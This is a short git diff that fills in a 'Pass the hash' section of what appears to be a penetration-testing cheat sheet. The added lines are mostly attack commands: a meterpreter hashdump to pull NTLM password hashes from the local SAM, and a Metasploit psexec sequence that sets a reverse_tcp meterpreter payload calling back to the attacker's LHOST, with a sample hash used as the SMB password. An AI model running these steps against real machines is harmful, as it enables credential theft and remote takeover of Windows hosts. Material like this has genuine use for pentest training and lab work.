@@ -115,7 +115,25 @@ hashcat -m 18200 --force -a 0 hashes.file passwords.txt
 ------------------------------------------------------------------------------------------------------------------------
 # Pass the hash
 
-# //TODO!
+- Dump the contents of local SAM file, which contains the hashed(NTLM) passwords for every local account on the machine
+```
+meterpreter> hashdump
+```
+
+- psexec via msfconsole
+```
+msf> search psexec
+
+msf> use exploit/windows/smb/psexec
+
+msf> set payload widnows/meterpreter/reverse_tcp
+msf> set LHOST <your_ip>
+msf> set LPORT <your_port>
+msf> set RHOST <target_ip>
+msf> set SMBPass e.g (e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c)
+msf> exploit
+```
+
 ------------------------------------------------------------------------------------------------------------------------
 
 # SSH key cracking
